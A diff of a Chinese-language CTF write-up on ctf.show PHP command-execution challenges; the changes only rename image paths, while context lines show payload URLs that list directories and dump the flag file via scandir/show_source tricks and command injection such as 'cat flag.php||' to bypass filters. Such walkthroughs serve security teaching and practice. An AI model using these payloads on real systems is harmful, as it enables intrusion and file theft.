@@ -9,7 +9,7 @@ description: >-
 
 ### 1.代码解释
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 error_reporting(0);
@@ -640,7 +640,7 @@ if(isset($_GET['c'])){
 http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandir(pos(localeconv())));
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以看到我们要访问倒数第二个文件，所以我们接下来的代码是
 
@@ -648,7 +648,7 @@ http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandi
 http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag。
 
@@ -685,7 +685,7 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 要理解这段代码之前需要先了解一个I/O流的一个写法
 
@@ -699,13 +699,13 @@ if(isset($_GET['c'])){
 http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=ls||
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=cat flag.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -736,7 +736,7 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 就是和以前一样过滤，但是我们的||还能用，所以可以继续使用
 
@@ -744,7 +744,7 @@ if(isset($_GET['c'])){
 http://4dca9ec0-61b7-4341-9aa0-af0be0639a36.challenge.ctf.show/?c=more flag.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -775,7 +775,7 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 绕过过滤的方法前面都介绍过了这里就不赘叙了。后面也都不特意说了，大家自己看看wp就能明白
 
